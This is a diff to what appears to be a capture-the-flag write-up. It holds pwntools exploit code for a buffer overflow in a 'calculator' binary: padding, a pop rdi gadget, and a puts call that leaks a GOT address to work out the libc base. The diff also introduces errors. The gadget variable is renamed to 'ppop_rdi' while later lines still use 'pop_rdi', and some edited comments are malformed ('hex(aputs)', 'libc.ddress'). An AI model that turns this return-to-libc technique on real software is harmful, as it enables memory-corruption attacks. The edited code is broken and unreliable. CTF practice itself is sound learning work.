@@ -137,15 +137,15 @@ p.sendlineafter('> ','2')
 * Here, the first argument(address) is to be pooped into RDI. 
 * The code to leak:
 ```
-pop_rdi = next(binary.search(asm('pop rdi; ret'))) #Searching for pop rdi
+ppop_rdi = next(binary.search(asm('pop rdi; ret'))) #Searching for pop rdi
 
-payload  = 40 * b'A' # our bof-ing value with padding : 32+8
-payload += p64(pop_rdi)
-payload += p64(binary.got.puts) #getting the address
-payload += p64(binary.plt.puts)
-payload += p64(binary.sym.calculator) #calls the function calculator again
+leak = 40 * b'A' # our overflow value with padding : 32+8
+leak += p64(pop_rdi)
+leak += p64(binary.got.puts)
+leak += p64(binary.plt.puts)
+leak += p64(binary.sym.calculator) 
 
-p.sendlineafter('> ',payload)
+p.sendlineafter('> ',leak)
 
 p.recvuntil('ingored\n')
 address= u64(p.recv(6) + b'\0\0')
@@ -186,10 +186,10 @@ leak += p64(binary.sym.calculator)
 p.sendlineafter('> ',leak)
 
 p.recvuntil('ingored\n')
-address= u64(p.recv(6) + b'\0\0')
-#log.info('puts: ' + hex(address))
-libc.address = address - libc.sym.puts
-#log.info('libc.address: ' + hex(libc.address))
+puts= u64(p.recv(6) + b'\0\0')
+#log.info('puts: ' + hex(aputs)
+libc.address = puts - libc.sym.puts
+#log.info('libc.address: ' + hex(libc.ddress))
 
 p.sendlineafter(': ','-65338 -130676')
 p.sendlineafter('> ','2')
